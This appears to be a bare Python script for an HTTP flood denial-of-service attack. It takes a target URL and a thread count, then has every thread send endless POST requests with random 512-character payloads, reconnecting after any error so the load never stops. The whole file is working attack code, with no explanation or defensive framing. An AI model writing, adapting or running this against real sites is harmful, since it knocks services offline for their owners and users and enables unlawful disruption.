import sys,threading,random,http.client,urllib.parse
u,t=sys.argv[1],int(sys.argv[2])
p=urllib.parse.urlparse(u);h=p.netloc;P=p.path or '/'
def w():
 c=http.client.HTTPSConnection(h)if p.scheme=='https'else http.client.HTTPConnection(h)
 while 1:
  try:c.request('POST',P,'p='+''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',k=512)),{'Content-type':'application/x-www-form-urlencoded'});r=c.getresponse();r.read()
  except:c.close();c=http.client.HTTPSConnection(h)if p.scheme=='https'else http.client.HTTPConnection(h)
for _ in range(t):threading.Thread(target=w,daemon=1).start()
threading.Event().wait()